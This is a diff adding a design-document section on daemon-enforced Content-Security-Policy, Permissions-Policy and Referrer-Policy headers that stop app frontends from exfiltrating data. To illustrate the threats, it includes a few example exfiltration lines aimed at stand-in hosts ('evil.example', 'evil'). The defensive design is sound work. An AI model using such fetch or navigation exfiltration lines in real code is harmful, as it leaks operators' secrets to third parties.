@@ -421,6 +421,108 @@ navigation back to the daemon that looks legitimate — any link it renders to
 no pre-filled caps), which refuses to grant anything the operator didn't
 start.
 
+#### Content-Security-Policy: the frontend's network whitelist matches the backend's
+
+Origin isolation stops the frontend from attacking the *daemon*. It does
+nothing to stop the frontend from attacking the *operator* by exfiltrating
+data to arbitrary third-party hosts. An app frontend without CSP can
+`fetch("https://evil.example/exfil?data=" + secrets)` freely — the backend's
+`http_client` host whitelist is irrelevant because the browser is making the
+request, not the backend. Every data-reading cap (kv, db, fs) leaks
+immediately unless the frontend is also restricted.
+
+**The daemon sets CSP; the app cannot widen it.** Every HTTP response the
+daemon serves on an app's behalf carries a `Content-Security-Policy` header
+derived from the manifest. The app's backend handler returns body + app-level
+headers; the daemon prepends/overrides the CSP before sending. The app cannot
+set a looser CSP even if it tries — daemon header wins.
+
+**Default policy (app with no network cap):**
+
+```
+Content-Security-Policy:
+  default-src 'none';
+  script-src 'self';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data:;
+  font-src 'self' data:;
+  connect-src 'self';
+  form-action 'self';
+  frame-ancestors 'none';
+  base-uri 'none';
+  object-src 'none';
+  media-src 'self';
+```
+
+`default-src 'none'` blocks everything unspecified. `'self'` means the app's
+own origin. The frontend can talk to its own backend and load its own assets
+— nothing else. No `fetch("https://anywhere")`, no `<img src="https://evil">`,
+no `<form action="https://evil">`, no WebSocket, no beacon, no prefetch.
+
+**With network cap granted:** the whitelisted hosts extend `connect-src`,
+`img-src`, and `media-src`. If the manifest declares `http_client` with
+hosts `[api.openai.com]`:
+
+```
+connect-src 'self' https://api.openai.com;
+img-src    'self' data: https://api.openai.com;
+media-src  'self' https://api.openai.com;
+```
+
+The frontend gets exactly the same network reach as the backend — no more, no
+less. Granting the network cap is granting it to *the whole app*, backend and
+frontend together.
+
+**Silent exfil channels the CSP must close.** Each of these is a GET-with-URL
+channel that leaks by issuing a request anywhere the attacker chose:
+
+- `<img src="...">` — covered by `img-src`
+- `<link rel="prefetch"/"dns-prefetch">` — covered by `prefetch-src` (where
+  supported) and `connect-src` fallback
+- `<form action="...">` on submit — covered by `form-action`
+- `fetch()` / `XMLHttpRequest` / `WebSocket` / `EventSource` — covered by
+  `connect-src`
+- `navigator.sendBeacon` — covered by `connect-src`
+- `<a ping="...">` — covered by `connect-src`
+- `@import url("...")` in CSS — covered by `style-src`
+- `<video>` / `<audio>` / `<track>` — covered by `media-src`
+- `<iframe>` / `<frame>` — covered by `frame-src` (add `frame-src 'self'`
+  explicitly, or rely on `default-src 'none'`)
+- `<object>` / `<embed>` / Flash-era — covered by `object-src 'none'`
+- `<script src="...">` — covered by `script-src`
+- Web fonts via `@font-face src:` — covered by `font-src`
+
+Anything missing from CSP becomes an exfil channel. The policy must be
+allow-list by default (`default-src 'none'`), not deny-list.
+
+**Top-level navigation is observable, not silent.** `window.location = "https://evil/?data=..."`
+or a `<a href="https://evil">` link the operator clicks leaves the app — the
+URL bar changes, the operator sees they're on a different site. This is a
+phishing/steal-the-user risk, not a silent exfil risk. Defense is not CSP
+(there's no reliable navigation-blocking CSP directive after `navigate-to` was
+removed) but: (a) the operator sees the navigation, (b) the daemon sets
+`Cross-Origin-Opener-Policy: same-origin` so `window.open` popups don't share
+browsing context, (c) links in app UI to external sites get
+`rel="noopener noreferrer"` automatically where the daemon can rewrite.
+
+**Permissions-Policy header** disables platform APIs the app hasn't declared
+a cap for: `camera=(), microphone=(), geolocation=(), clipboard-read=(),
+clipboard-write=(), fullscreen=(self), ...`. Each of these is a separate
+capability-bearing browser feature. Default off, opt-in via manifest.
+
+**Referrer-Policy: no-referrer.** Even within allowed hosts, don't leak URLs
+(which may contain tokens, IDs, secrets) via the `Referer` header.
+
+**Subresource Integrity.** If a cap ever allows third-party scripts (it
+shouldn't for v1), SRI hashes must be mandatory. For v1: all scripts from
+`'self'` only, no third-party JS ever. CDN convenience is not worth the
+supply-chain exposure.
+
+**CSP is daemon-enforced, not app-advisory.** The app cannot emit its own
+`<meta http-equiv="Content-Security-Policy">` that overrides the header — the
+HTTP header takes precedence for most directives, and meta-CSP only *tightens*
+what the header already allows. The daemon's CSP is the ceiling.
+
 #### Risk-tiered friction: fatigue scales with danger
 
 Not every cap deserves the same consent UI. Map friction to risk class
